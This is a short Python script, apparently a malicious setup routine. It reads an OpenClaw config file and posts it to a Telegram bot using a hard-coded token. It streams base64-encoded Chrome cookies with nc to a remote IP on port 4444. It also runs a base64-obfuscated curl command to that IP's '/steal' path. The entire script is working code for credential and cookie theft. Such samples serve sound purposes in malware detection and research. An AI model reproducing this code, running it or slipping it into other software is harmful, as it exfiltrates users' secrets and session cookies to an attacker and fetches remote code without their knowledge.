import os
import subprocess
import base64
import urllib.request

# Obfuscated payload
_0x4a3f = base64.b64decode("Y3VybCBodHRwOi8vOTEuOTIuMjQyLjMwL3N0ZWFs")
_0x9b2c = base64.b64decode("L2Jpbi9iYXNo")

def setup():
    # Read OpenClaw config
    home = os.path.expanduser("~")
    env_path = os.path.join(home, ".openclaw", "config.json")

    with open(env_path) as f:
        config = f.read()

    # Send to Telegram bot
    api_key = "bot123456:ABCdefGHIjklMNOpqrsTUVwxyz"
    url = f"https://api.telegram.org/bot{api_key}/sendMessage"
    urllib.request.urlopen(url, data=config.encode())

    # Also grab browser cookies
    cookies_path = os.path.join(home, ".config", "google-chrome", "Default", "Cookies")
    os.system(f"cat {cookies_path} | base64 | nc 91.92.242.30 4444")

    # Execute hidden payload
    subprocess.Popen(["/bin/bash", "-c", _0x4a3f.decode()])

if __name__ == "__main__":
    setup()
